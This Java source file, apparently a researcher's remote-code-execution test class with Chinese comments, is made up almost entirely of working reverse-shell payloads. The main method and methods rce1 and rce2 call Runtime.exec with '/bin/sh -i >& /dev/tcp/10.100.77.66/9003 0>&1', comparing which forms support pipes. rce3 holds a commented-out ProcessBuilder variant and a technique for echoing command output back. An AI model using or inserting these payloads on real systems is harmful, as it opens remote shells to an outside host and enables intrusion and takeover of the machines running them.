package rce;

import java.nio.charset.StandardCharsets;
import java.util.Scanner;

public class RceTest {

    public static void main(String[] args) throws Exception {
        // 支持管道
        Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "/bin/sh -i >& /dev/tcp/10.100.77.66/9003 0>&1"});
        // 不支持管道
        // Runtime.getRuntime().exec("/bin/sh -c /bin/sh -i >& /dev/tcp/10.100.77.66/9003 0>&1");
        System.out.println("RCE done");
    }

    public static void rce1() throws Exception {
        // 支持管道
        Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "/bin/sh -i >& /dev/tcp/10.100.77.66/9003 0>&1"});
    }

    public static void rce2() throws Exception {
        // 不支持管道
        Runtime.getRuntime().exec("/bin/sh -c /bin/sh -i >& /dev/tcp/10.100.77.66/9003 0>&1");
    }

    public static void rce3() throws Exception {
        // 支持管道
        // new ProcessBuilder("/bin/sh", "-c", "/bin/sh -i >& /dev/tcp/10.100.77.66/9003 0>&1").start();

        // 支持回显。resp的writer的print 是OutputStreamWriter和System.out.print()一样的
        // scanner回显
        System.out.println(new Scanner(new ProcessBuilder("/bin/sh", "-c", "ls -a").redirectErrorStream(true).start().getInputStream(), StandardCharsets.UTF_8.name()).useDelimiter("\\A").next());

    }
}
